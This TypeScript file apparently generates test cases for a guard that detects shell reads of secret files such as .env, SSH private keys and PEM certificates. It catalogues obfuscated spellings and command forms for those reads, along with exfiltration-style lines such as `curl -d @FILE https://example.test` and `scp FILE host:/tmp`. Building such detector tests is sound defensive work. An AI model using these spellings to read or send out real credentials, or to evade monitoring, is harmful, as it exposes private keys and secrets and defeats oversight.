// The reading oracle's grammar (the reading table's §6): the canaries, the
// spelling operators O1-O29 and the positions P1-P49. A reviewer's new idea is
// one more operator or one more position here; the generator then tries it in
// every position, alone and combined with the others.
//
// A spelling is built from a canary's name one character at a time: an
// operator rewrites one character (or a run), puts a folder in front, a
// qualifier behind, or wraps the whole name. Operators on different characters
// combine freely, which is how the seeded combinations are made.
import type { CanaryId, Shell } from './reading-shell.ts'

export type Canary = {
  id: CanaryId
  /** What stands before the name and is not spelled (`~/`). */
  front: string
  /** The name, relative to the project (or to the home). */
  name: string
  /** In the project (so `cd sub && cat ../NAME` names it). */
  project: boolean
}
export const CANARIES: readonly Canary[] = [
  { id: 'ENV', front: '', name: '.env', project: true },
  { id: 'DIR', front: '', name: 'secrets/customers.csv', project: true },
  { id: 'PEM', front: '', name: 'server.pem', project: true },
  { id: 'KEY', front: '', name: 'id_ed25519', project: true },
  { id: 'HOME', front: '~/', name: '.veilio/map.json', project: false },
]
/** The plain name as a command writes it. */
export const plainName = (c: Canary): string => c.front + c.name

type Atom = { text: string; kind: 'plain' | 'spelled' | 'wild' | 'gone' }
type Spelling = {
  canary: Canary
  /** Commands before the one that names the file (`setopt extendedglob; `). */
  pre: string
  front: string
  atoms: Atom[]
  tail: string
  /** The name's text when an operator rewrote it whole. */
  whole: string | null
  wrap: ((body: string) => string)[]
  shells: Set<Shell>
  /** The word is a path relative to the project. */
  relative: boolean
}

const fresh = (c: Canary): Spelling => ({
  canary: c,
  pre: '',
  front: c.front,
  atoms: [...c.name].map((text) => ({ text, kind: 'plain' })),
  tail: '',
  whole: null,
  wrap: [],
  shells: new Set(['bash', 'zsh']),
  relative: c.project,
})

function render(s: Spelling): string {
  let body = s.whole ?? s.atoms.map((a) => a.text).join('')
  for (const w of s.wrap) body = w(body)
  return s.front + body + s.tail
}

/** No path part of the name may be left with nothing but wildcards (limit L4). */
function partsKeepText(s: Spelling): boolean {
  let plain = false
  for (let i = 0; i <= s.atoms.length; i++) {
    const a = s.atoms[i]
    if (!a || a.text === '/') {
      if (!plain) return false
      plain = false
    } else if (a.kind === 'plain' || a.kind === 'spelled') plain = true
  }
  return true
}

/** One way to apply an operator: null when it does not fit this spelling. */
type Edit = (s: Spelling) => boolean
type Operator = {
  id: string
  /** The edits for a canary: at its pivot characters only (the full product),
   *  or at every character the operator fits (the combinations). */
  edits: (c: Canary, everywhere: boolean) => Edit[]
}

const isAlnum = (c: string) => /[A-Za-z0-9]/.test(c)
const isLetter = (c: string) => /[A-Za-z]/.test(c)
const isDigit = (c: string) => /[0-9]/.test(c)
/** A character a wildcard can stand for: not `/`, not a part's leading dot. */
const globbable = (c: Canary, i: number) =>
  c.name[i] !== '/' && !(c.name[i] === '.' && (i === 0 || c.name[i - 1] === '/'))

/** The characters of the full product: one inside the part the canary's
 *  pattern fixes, one elsewhere. */
const PIVOTS: Record<CanaryId, number[]> = {
  ENV: [2],
  DIR: [2, 11],
  PEM: [9, 3],
  KEY: [3, 7],
  HOME: [3, 9],
}

/** An edit of one character, where `fits` allows it. */
function perChar(
  fits: (c: Canary, i: number) => boolean,
  make: (ch: string, c: Canary, i: number) => string[],
  kind: Atom['kind'],
  also: (s: Spelling) => void = () => {}
): Operator['edits'] {
  return (c, everywhere) => {
    const out: Edit[] = []
    const at = everywhere ? [...c.name].map((_, i) => i) : PIVOTS[c.id]
    for (const i of at) {
      if (!fits(c, i)) continue
      for (const text of make(c.name[i]!, c, i))
        out.push((s) => {
          if (s.whole !== null || s.atoms[i]!.kind !== 'plain') return false
          s.atoms[i] = { text, kind }
          also(s)
          return true
        })
    }
    return out
  }
}
const any = () => true
const only =
  (...shells: Shell[]) =>
  (s: Spelling) => {
    for (const sh of [...s.shells]) if (!shells.includes(sh)) s.shells.delete(sh)
  }
const hex = (ch: string) => ch.charCodeAt(0).toString(16).padStart(2, '0')
const oct = (ch: string) => ch.charCodeAt(0).toString(8).padStart(3, '0')
/** `$Z` may stand before a character that cannot continue its name. */
const bare = (next: string | undefined) => next === undefined || !/[A-Za-z0-9_]/.test(next)

/** A front put before a project canary's name. */
const fronts =
  (make: (c: Canary) => { front: string; relative: boolean; shells?: Shell[] }[]) =>
  (c: Canary): Edit[] =>
    make(c).map((f) => (s) => {
      if (s.front !== c.front) return false
      s.front = f.front
      s.relative = f.relative
      if (f.shells) only(...f.shells)(s)
      return true
    })

/** The whole name rewritten (no other operator then touches its characters). */
const wholeName =
  (make: (c: Canary) => string[], ...shells: Shell[]) =>
  (c: Canary): Edit[] =>
    make(c).map((text) => (s) => {
      if (s.whole !== null || s.wrap.length > 0 || s.atoms.some((a) => a.kind !== 'plain'))
        return false
      s.whole = text
      if (shells.length) only(...shells)(s)
      return true
    })

/** The name, however spelled, put inside an expansion. */
const wrapped =
  (wraps: ((body: string) => string)[], ...shells: Shell[]) =>
  (): Edit[] =>
    wraps.map((w) => (s) => {
      if (s.wrap.length > 0 || s.whole !== null) return false
      s.wrap.push(w)
      if (shells.length) only(...shells)(s)
      return true
    })

const both =
  (...lists: Operator['edits'][]): Operator['edits'] =>
  (c, everywhere) =>
    lists.flatMap((l) => l(c, everywhere))

/** The digits of the KEY canary's name, as one run. */
const digitRun =
  (make: (digits: string) => string[], kind: Atom['kind'], ...shells: Shell[]) =>
  (c: Canary): Edit[] => {
    const m = /\d+/.exec(c.name)
    if (c.id !== 'KEY' || !m) return []
    return make(m[0]).map((text) => (s) => {
      if (s.whole !== null) return false
      const run = s.atoms.slice(m.index, m.index + m[0].length)
      if (run.some((a) => a.kind !== 'plain')) return false
      run.forEach((a, k) =>
        Object.assign(a, { text: k === 0 ? text : '', kind: k === 0 ? kind : 'gone' })
      )
      if (shells.length) only(...shells)(s)
      return true
    })
  }

/** `*` for a run of one or two characters inside a part; never the fixed text
 *  of the PEM and KEY canaries' patterns (limit L5). */
const innerStar: Operator['edits'] = (c, everywhere) => {
  if (c.id === 'KEY') return []
  const out: Edit[] = []
  const end = c.id === 'PEM' ? c.name.indexOf('.') : c.name.length
  const at = everywhere ? [...c.name].map((_, i) => i) : PIVOTS[c.id]
  for (const i of at)
    for (const len of [1, 2]) {
      if (i + len > end) continue
      if (![...Array(len).keys()].every((k) => globbable(c, i + k))) continue
      out.push((s) => {
        if (s.whole !== null) return false
        const run = s.atoms.slice(i, i + len)
        if (run.some((a) => a.kind !== 'plain')) return false
        run.forEach((a, k) =>
          Object.assign(a, { text: k === 0 ? '*' : '', kind: k === 0 ? 'wild' : 'gone' })
        )
        return true
      })
    }
  return out
}

/** A leading `*` for a part's leading dot, with what lets it match: an
 *  option set before the command, or zsh's `(D)` qualifier behind the word. */
const dotStar =
  (pre: string, shell: Shell, tail = ''): Operator['edits'] =>
  (c) => {
    if (c.name[0] !== '.') return []
    return [
      (s) => {
        if (s.whole !== null || s.pre !== '' || s.atoms[0]!.kind !== 'plain') return false
        if (tail !== '' && (s.tail !== '' || s.wrap.length > 0)) return false
        s.atoms[0] = { text: '*', kind: 'wild' }
        s.pre = pre
        if (tail !== '') s.tail = tail
        only(shell)(s)
        return true
      },
    ]
  }

/** A leading `*` for a part's leading dot, nothing said about options. */
const bareStar: Operator['edits'] = (c) =>
  c.name[0] !== '.'
    ? []
    : [
        (s) => {
          if (s.whole !== null || s.atoms[0]!.kind !== 'plain') return false
          s.atoms[0] = { text: '*', kind: 'wild' }
          return true
        },
      ]

const withPre = (pre: string, shell: Shell) => (s: Spelling) => {
  s.pre = pre
  only(shell)(s)
}
/** An option-dependent edit: one per spelling (they set the command's start). */
const optioned = (
  pre: string,
  shell: Shell,
  fits: (c: Canary, i: number) => boolean,
  make: (ch: string) => string[]
): Operator['edits'] => {
  const inner = perChar(fits, make, 'wild', withPre(pre, shell))
  return (c, everywhere) => inner(c, everywhere).map((e) => (s: Spelling) => s.pre === '' && e(s))
}

export const OPERATORS: readonly Operator[] = [
  { id: 'O1', edits: perChar(any, (ch) => [`${ch}''`, `${ch}""`], 'spelled') },
  { id: 'O2', edits: perChar(any, (ch) => [`'${ch}'`], 'spelled') },
  { id: 'O3', edits: perChar(any, (ch) => [`"${ch}"`], 'spelled') },
  {
    id: 'O4',
    edits: perChar(
      (c, i) => isAlnum(c.name[i]!),
      (ch) => [`\\${ch}`],
      'spelled'
    ),
  },
  { id: 'O5', edits: perChar(any, (ch) => [`${ch}\\\n`], 'spelled') },
  { id: 'O6', edits: perChar(any, (ch) => [`$'${ch}'`], 'spelled') },
  {
    id: 'O7',
    edits: perChar(
      any,
      (ch) => [`$'\\x${hex(ch)}'`, `$'\\${oct(ch)}'`, `$'\\u00${hex(ch)}'`],
      'spelled'
    ),
  },
  { id: 'O8', edits: perChar(any, (ch) => [`$"${ch}"`], 'spelled') },
  { id: 'O9', edits: perChar(any, (ch) => [`{${ch},x}`, `{{${ch},y},x}`], 'spelled') },
  { id: 'O10', edits: perChar(any, (ch) => [`{${ch},}`], 'spelled') },
  {
    id: 'O11',
    edits: perChar(
      (c, i) => isAlnum(c.name[i]!),
      (ch) => [`{${ch}..${ch}}`],
      'spelled'
    ),
  },
  { id: 'O12', edits: perChar(globbable, (ch) => [`[${ch}]`], 'spelled') },
  {
    id: 'O13',
    edits: perChar(
      (c, i) => isAlnum(c.name[i]!),
      (ch) => {
        const lo = /[a0A]/.test(ch) ? ch : String.fromCharCode(ch.charCodeAt(0) - 1)
        const hi = /[z9Z]/.test(ch) ? ch : String.fromCharCode(ch.charCodeAt(0) + 1)
        return [`[${lo}-${hi}]`]
      },
      'spelled'
    ),
  },
  {
    id: 'O14',
    edits: perChar(
      globbable,
      (ch) => [isLetter(ch) ? '[[:alpha:]]' : isDigit(ch) ? '[[:digit:]]' : '[[:punct:]]'],
      'wild'
    ),
  },
  { id: 'O15', edits: perChar(globbable, (ch) => [ch === 'x' ? '[!q]' : '[!x]', '[^X]'], 'wild') },
  { id: 'O16', edits: perChar(globbable, () => ['?'], 'wild') },
  { id: 'O17', edits: innerStar },
  {
    id: 'O18',
    edits: (c) =>
      c.id !== 'HOME'
        ? []
        : fronts(() =>
            ['$HOME/', '${HOME}/', '"$HOME"/', '"${HOME}"/'].map((front) => ({
              front,
              relative: false,
            }))
          )(c),
  },
  {
    id: 'O19',
    edits: (c) =>
      !c.project
        ? []
        : fronts(() => [
            { front: './', relative: true },
            { front: 'sub/../', relative: true },
            { front: './/', relative: true },
            { front: '@PROJ@/', relative: false },
          ])(c),
  },
  {
    id: 'O20',
    edits: perChar(
      any,
      (ch, c, i) => [
        `${ch}\${Z}`,
        `${ch}"$Z"`,
        `\${Z}${ch}`,
        ...(bare(c.name[i + 1]) ? [`${ch}$Z`] : []),
        ...(bare(ch) ? [`$Z${ch}`] : []),
      ],
      'spelled'
    ),
  },
  {
    id: 'O21',
    edits: both(
      perChar(
        any,
        (ch) => [`\${x:-${ch}}`, `\${x-${ch}}`, `\${HOME:+${ch}}`, `\${x:-\${y:-${ch}}}`],
        'spelled'
      ),
      (c) =>
        wrapped([
          (b) => `\${x:-${b}}`,
          (b) => `\${x-${b}}`,
          (b) => `\${x:=${b}}`,
          (b) => `\${x=${b}}`,
          (b) => `\${HOME:+${b}}`,
          (b) => `\${HOME+${b}}`,
          (b) => `\${x:-\${y:-${b}}}`,
          (b) => `"\${x:-${b}}"`,
        ])().map(
          (e): Edit =>
            (s) =>
              // The value starts the word: a front outside it would not be the name.
              c.front === '' && e(s)
        )
    ),
  },
  {
    id: 'O22',
    edits: (c) =>
      !c.project
        ? []
        : fronts(() => [
            { front: '$PWD/', relative: false },
            { front: '"$PWD"/', relative: false },
            { front: '$(pwd)/', relative: false },
            { front: '`pwd`/', relative: false },
            { front: '~+/', relative: false },
          ])(c),
  },
  { id: 'O23', edits: digitRun((d) => [`$((${d}))`, `$(( ${d} + 0 ))`], 'spelled') },
  {
    id: 'O24',
    edits: perChar(globbable, (ch) => [`(${ch})`, `(${ch}|x)`], 'wild', only('zsh')),
  },
  {
    id: 'O25',
    edits: both(
      (c, everywhere) =>
        perChar(
          globbable,
          () => ['?'],
          'wild'
        )(c, everywhere).flatMap((e) =>
          ['(.)', '(N)'].map((tail): Edit => (s) => {
            if (s.tail !== '' || s.wrap.length > 0 || !e(s)) return false
            s.tail = tail
            only('zsh')(s)
            return true
          })
        ),
      // `(D)`: the word's wildcards match a leading dot.
      dotStar('', 'zsh', '(D)')
    ),
  },
  { id: 'O26', edits: digitRun(() => ['<->', '<1-99999>'], 'wild', 'zsh') },
  {
    id: 'O27',
    edits: both(
      perChar(any, (ch) => [`\${:-${ch}}`], 'spelled', only('zsh')),
      wrapped([(b) => `\${:-${b}}`], 'zsh')
    ),
  },
  {
    id: 'O28',
    edits: wholeName(
      (c) => [
        `\${\${:-${c.name.slice(0, 2)}X${c.name.slice(2)}}/X}`,
        `\${(L):-${c.name.toUpperCase()}}`,
      ],
      'zsh'
    ),
  },
  {
    id: 'O29',
    edits: both(
      optioned('setopt extendedglob; ', 'zsh', globbable, (ch) => [`${ch}q#`, `^x${ch}`]),
      optioned(
        'setopt braceccl; ',
        'zsh',
        (c, i) => isAlnum(c.name[i]!),
        (ch) => [`{${ch}}`]
      ),
      optioned('shopt -s extglob\n', 'bash', globbable, (ch) => [
        `@(${ch})`,
        `+(${ch})`,
        `${ch}?(x)`,
      ]),
      dotStar('shopt -s dotglob; ', 'bash'),
      dotStar('setopt globdots; ', 'zsh'),
      // Other ways to set the option (reading table §2).
      dotStar('options[globdots]=on; ', 'zsh'),
      dotStar('S=setopt; $S globdots; ', 'zsh'),
      dotStar('builtin setopt globdots; ', 'zsh'),
      // The program word built at run time, behind a modifier or eval.
      dotStar('S=setopt; builtin - $S globdots; ', 'zsh'),
      dotStar('S=setopt; eval $S globdots; ', 'zsh'),
      // No option set here: a shell started with one reads it (P36-P38).
      bareStar
    ),
  },
]

// ── positions ──

/** A word inside `"..."`, inside `'...'`, inside backticks. */
const dq = (w: string) => w.replace(/[\\"$`]/g, '\\$&')
const sq = (w: string) => w.replace(/'/g, `'\\''`)
const bt = (w: string) => w.replace(/[\\`]/g, '\\$&')

export type Position = {
  id: string
  /** The command with W in its place. */
  make: (w: string) => string
  executed: boolean
  /** Only this shell runs it. */
  shell?: Shell
  /** Another shell (bash or sh) reads W, whatever shell runs the command. */
  inner?: true
  /** W must be a path relative to the project (it follows `../`). */
  relative?: true
  /** One of many positions of a kind: tried with a sample of the spellings
   *  (a brace list and a bracket list of the ENV canary), not with all. */
  sample?: true
}

const run = (id: string, make: Position['make'], more: Partial<Position> = {}): Position => ({
  id,
  make,
  executed: true,
  ...more,
})
const judged = (id: string, make: Position['make']): Position => ({ id, make, executed: false })

export const POSITIONS: readonly Position[] = [
  run('P1', (w) => `cat ${w}`),
  run('P2', (w) => `cat src/index.ts ${w}`),
  run('P3', (w) => `cat -- ${w}`),
  run('P4', (w) => `cat < ${w}`),
  run('P5', (w) => `cat <${w}`),
  run('P6', (w) => `cat 0< ${w}`),
  run('P7', (w) => `{ cat; } < ${w}`),
  run('P8', (w) => `( cat ) < ${w}`),
  run('P9', (w) => `if true; then cat; fi < ${w}`),
  run('P10', (w) => `while read -r l; do echo "$l"; done < ${w}`),
  run('P11', (w) => `for i in 1; do cat; done < ${w}`),
  run('P12', (w) => `case x in x) cat ;; esac < ${w}`),
  run('P13', (w) => `echo "$(cat ${w})"`),
  run('P14', (w) => `echo \`cat ${bt(w)}\``),
  run('P15', (w) => `echo "$(< ${w})"`),
  run('P16', (w) => `cat <(cat ${w})`),
  run('P17', (w) => `cat =(cat ${w})`, { shell: 'zsh' }),
  run('P18', (w) => `echo \${x:-$(cat ${w})}`),
  run('P19', (w) => `echo "\${x:-$(cat ${w})}"`),
  run('P20', (w) => `: $(( $(cat ${w}) ))`),
  run('P21', (w) => `F=${w}; cat "$F"`),
  run('P22', (w) => `export F=${w}; cat $F`),
  run('P23', (w) => `F=${w} sh -c 'cat "$F"'`),
  run('P24', (w) => `a=(${w}); cat "\${a[@]}"`),
  run('P25', (w) => `for f in ${w}; do cat "$f"; done`),
  run('P26', (w) => `dd if=${w} 2>/dev/null`),
  run('P28', (w) => `eval "cat ${dq(w)}"`),
  run('P29a', (w) => `bash -c "cat ${dq(w)}"`, { inner: true }),
  run('P29b', (w) => `sh -c 'cat ${sq(w)}'`, { inner: true }),
  run('P30', (w) => `cat <<EOF\n$(cat ${w})\nEOF`),
  run('P31', (w) => `xargs cat <<< ${w}`),
  run('P32', (w) => `echo ${w} | xargs cat`),
  run('P33', (w) => `cd sub && cat ../${w}`, { relative: true }),
  run('P34', (w) => `cd sub; cat "$PWD"/../${w}`, { relative: true }),
  run('P35', (w) => `test -r ${w} && cat ${w}`),
  // A shell started with an option that changes how it reads words.
  run('P36', (w) => `bash -O dotglob -c "cat ${dq(w)}"`, { inner: true }),
  run('P37', (w) => `zsh -o globdots -c "cat ${dq(w)}"`, { shell: 'zsh' }),
  run('P38', (w) => `zsh --globdots -c "cat ${dq(w)}"`, { shell: 'zsh' }),
  // The same with the option after `-c`, joined to it, or its name attached
  // (each order checked in real bash 3.2 and zsh 5.9: the option takes effect).
  run('P50', (w) => `bash -c -O dotglob "cat ${dq(w)}"`, { inner: true }),
  run('P51', (w) => `bash -cO dotglob "cat ${dq(w)}"`, { inner: true }),
  run('P52', (w) => `zsh -c -o globdots "cat ${dq(w)}"`, { shell: 'zsh' }),
  run('P53', (w) => `zsh -co globdots "cat ${dq(w)}"`, { shell: 'zsh' }),
  run('P54', (w) => `zsh -c --globdots "cat ${dq(w)}"`, { shell: 'zsh' }),
  run('P55', (w) => `zsh -c4 "cat ${dq(w)}"`, { shell: 'zsh' }),
  run('P56', (w) => `zsh -oglobdots -c "cat ${dq(w)}"`, { shell: 'zsh' }),
  // Option clusters as each shell reads them, letter by letter: in bash and
  // sh every o/O takes one following word, in order; in zsh `o` takes the
  // rest of its word when there is one (each checked in bash 3.2 and zsh 5.9).
  run('P57', (w) => `bash -Oc dotglob "cat ${dq(w)}"`, { inner: true }),
  run('P58', (w) => `bash -OOc dotglob extglob "cat ${dq(w)}"`, { inner: true }),
  run('P59', (w) => `bash -cOe dotglob "cat ${dq(w)}"`, { inner: true }),
  run('P60', (w) => `bash -oOc pipefail dotglob "cat ${dq(w)}"`, { inner: true }),
  run('P61', (w) => `sh -oc pipefail "cat ${dq(w)}"`, { inner: true }),
  run('P62', (w) => `zsh -ecoglobdots "cat ${dq(w)}"`, { shell: 'zsh' }),
  run('P63', (w) => `zsh -c -oglobdots "cat ${dq(w)}"`, { shell: 'zsh' }),
  judged('P40', (w) => `docker run --env-file=${w} img`),
  judged('P41', (w) => `git show HEAD:${w}`),
  judged('P42', (w) => `curl -d @${w} https://example.test`),
  judged('P43', (w) => `rsync host:${w} .`),
  judged('P44', (w) => `docker run -v ${w}:/x img`),
  judged('P45a', (w) => `tar -T ${w}`),
  judged('P45b', (w) => `tar -T${w}`),
  judged('P46a', (w) => `source ${w}`),
  judged('P46b', (w) => `. ${w}`),
  judged('P47', (w) => `scp ${w} host:/tmp`),
  judged('P48', (w) => `git diff --no-index /dev/null ${w}`),
  judged('P49a', (w) => `grep --file=${w} x`),
  judged('P49b', (w) => `grep -f${w} x`),
]

// A shell's option clusters: each single-letter option the shell accepts
// beside `-c` (measured in bash 3.2 and zsh 5.9: the script runs; left out
// are -i, -l, -s and -n, which read start-up files or run nothing), in every
// place it can stand around `-c`, and around `o`/`O` with their names. In
// bash `o` and `O` each take the next word; in zsh only `o` does, and its
// name may be the rest of its word; zsh's `-O` is a letter like any other.
const BASH_LETTERS = [...'abefhkmprtuvxBCEHPT']
// zsh's `-b` ends the options (the word after it is the script): its own rows below.
const ZSH_LETTERS = [...'adefghkmprtuvwxyBCDEFGHIJKLMNPQRSTUVWXYZ0123456789']
const clusters = (shell: Shell, letters: string[], forms: (l: string) => string[]): Position[] =>
  letters.flatMap((l) =>
    forms(l).map((options) =>
      run(
        `P:${shell} ${options}`,
        (w) => `${shell} ${options} "cat ${dq(w)}"`,
        shell === 'zsh' ? { shell: 'zsh', sample: true } : { inner: true, sample: true }
      )
    )
  )
export const CLUSTERS: readonly Position[] = [
  ...clusters('bash', BASH_LETTERS, (l) => [
    `-${l}c`,
    `-c${l}`,
    `-${l} -c`,
    `-c -${l}`,
    `-o${l}c pipefail`,
    `-${l}co pipefail`,
    `-${l} -o pipefail -c`,
    `-O${l}c dotglob`,
    `-c${l}O dotglob`,
    `+O${l}c dotglob`,
  ]),
  ...clusters('zsh', ZSH_LETTERS, (l) => [
    `-${l}c`,
    `-c${l}`,
    `-${l} -c`,
    `-c -${l}`,
    `-${l}co globdots`,
    `-${l}c -oglobdots`,
    `-${l}c +o globdots`,
    `-O${l}c`,
    `-c${l}O`,
    `-${l} -O -c`,
  ]),
  // What ends the options: the script is the next word, whatever it starts with.
  ...(
    [
      ['zsh', '-cb'],
      ['zsh', '-bc'],
      ['zsh', '-c -b'],
      ['zsh', '-c --'],
      ['zsh', '-c -'],
      ['bash', '-c --'],
      ['bash', '-c -'],
      ['sh', '-c --'],
    ] as const
  ).flatMap(([shell, options]) =>
    ['', '-x; '].map((start) =>
      run(
        `P:${shell} ${options} ${start}`,
        (w) => `${shell} ${options} "${start}cat ${dq(w)}"`,
        shell === 'zsh' ? { shell: 'zsh', sample: true } : { inner: true, sample: true }
      )
    )
  ),
  // A long option that takes a value.
  run('P:bash --rcfile', (w) => `bash --rcfile /dev/null -c "cat ${dq(w)}"`, {
    inner: true,
    sample: true,
  }),
  run('P:zsh --emulate', (w) => `zsh --emulate zsh -c "cat ${dq(w)}"`, {
    shell: 'zsh',
    sample: true,
  }),
]

// ── the closed vocabulary (§6) ──

const VOCABULARY = new Set(
  'cat head tail dd grep sed awk printf echo read : true test [ [[ cd pwd export declare typeset local eval exec source . for while until if case setopt unsetopt shopt set alias bash sh zsh xargs env command nice mapfile'.split(
    ' '
  )
)
/** Words of the templates that are not programs: keywords, arguments, names. */
const FILLERS = new Set(
  'then fi do done in esac x l i f F a r s c e if EOF dev null src index ts sub PWD W extendedglob braceccl extglob dotglob globdots O o S options on builtin cO co c4 oglobdots Oc OOc cOe oOc oc pipefail ecoglobdots'.split(
    ' '
  )
)
for (const p of CLUSTERS)
  for (const m of p.make('W').matchAll(/[A-Za-z_][A-Za-z0-9_]*/g)) FILLERS.add(m[0])
FILLERS.add('rcfile').add('emulate')
const MARK = 'W'

/** Throws unless an executed command is made of the closed vocabulary and its
 *  word W can run nothing but `pwd`, write nothing and end no command. */
export function assertVocabulary(pre: string, position: Position, word: string): void {
  const skeleton = pre + position.make(MARK)
  for (const m of skeleton.matchAll(/[A-Za-z_][A-Za-z0-9_]*/g))
    if (!VOCABULARY.has(m[0]) && !FILLERS.has(m[0]))
      throw new Error(
        `reading grammar: ${JSON.stringify(m[0])} is outside the vocabulary: ${skeleton}`
      )
  const w = word
    .replace(/\$\(pwd\)|`pwd`/g, '')
    .replace(/<\d*-\d*>/g, '')
    .replace(/\\\n/g, '')
  if (/\$\((?!\()|`|[;&\n<>]|\|(?!x\))/.test(w))
    throw new Error(
      `reading grammar: the word ${JSON.stringify(word)} could run or write something`
    )
}

// ── the generator ──

export type Generated = {
  id: string
  operatorIds: string[]
  positionId: string
  canary: CanaryId
  command: string
  /** The same position with the plain name (rule R2). */
  plain: string
  /** The spelling alone in position P1, with its commands in front: the proof
   *  that the shell reads it as the name. */
  proof: string
  /** The shells the spelling is written for. */
  proofShells: Shell[]
  /** The shells that run it; none for a position that is only judged. */
  shells: Shell[]
}

/** `@PROJ@` in a word is the project's real path, known when the fixture is. */
const at = (text: string, proj: string) => text.split('@PROJ@').join(proj)

function command(
  id: string,
  operatorIds: string[],
  s: Spelling,
  p: Position,
  proj: string
): Generated | null {
  if (p.relative && !s.relative) return null
  // `<(` opens a process substitution and `F=(` an array: a word that starts
  // with a group cannot stand right after `<` or an assignment's `=`.
  if (['P5', 'P21', 'P23'].includes(p.id) && render(s).startsWith('(')) return null
  if (p.relative && !s.canary.project) return null
  const word = at(render(s), proj)
  const shells = !p.executed
    ? []
    : [...s.shells].filter(
        (sh) => (!p.shell || p.shell === sh) && (!p.inner || s.shells.has('bash'))
      )
  // The proof is run too, so the word is checked for every position.
  assertVocabulary(s.pre, p.executed ? p : POSITIONS[0]!, word)
  return {
    id,
    operatorIds,
    positionId: p.id,
    canary: s.canary.id,
    command: s.pre + p.make(word),
    plain: p.make(at(plainName(s.canary), proj)),
    proof: s.pre + POSITIONS[0]!.make(word),
    proofShells: [...s.shells],
    shells,
  }
}

/** Every operator's every edit at the pivot characters, in every position. */
export function fullProduct(proj: string): Generated[] {
  const out: Generated[] = []
  for (const c of CANARIES)
    for (const o of OPERATORS)
      o.edits(c, false).forEach((edit, k) => {
        const s = fresh(c)
        if (!edit(s) || !partsKeepText(s)) return
        for (const p of POSITIONS) {
          const g = command(`F:${c.id}:${o.id}.${k}:${p.id}`, [o.id], s, p, proj)
          if (g) out.push(g)
        }
        // The many option clusters: with a brace list and a bracket list.
        if (c.id === 'ENV' && k === 0 && (o.id === 'O10' || o.id === 'O12'))
          for (const p of CLUSTERS) {
            const g = command(`F:${c.id}:${o.id}.${k}:${p.id}`, [o.id], s, p, proj)
            if (g) out.push(g)
          }
      })
  return out
}

export function mulberry32(seed: number): () => number {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}

/** `n` commands of two or three operators applied to different places of one
 *  name, in a position, all chosen by a PRNG with a fixed seed. */
export function combinations(n: number, seed: number, proj: string): Generated[] {
  const rnd = mulberry32(seed)
  const pick = <T>(xs: readonly T[]): T => xs[Math.floor(rnd() * xs.length)]!
  const out: Generated[] = []
  for (let index = 0, tries = 0; out.length < n && tries < n * 50; tries++) {
    const c = pick(CANARIES)
    const s = fresh(c)
    const ids: string[] = []
    const want = rnd() < 0.5 ? 2 : 3
    for (let k = 0; k < 12 && ids.length < want; k++) {
      const o = pick(OPERATORS)
      const edits = o.edits(c, true)
      if (ids.includes(o.id) || edits.length === 0) continue
      if (pick(edits)(s)) ids.push(o.id)
    }
    if (ids.length < 2 || !partsKeepText(s)) continue
    const g = command(`C:${seed}:${index}`, ids, s, pick(POSITIONS), proj)
    if (!g) continue
    out.push(g)
    index++
  }
  return out
}
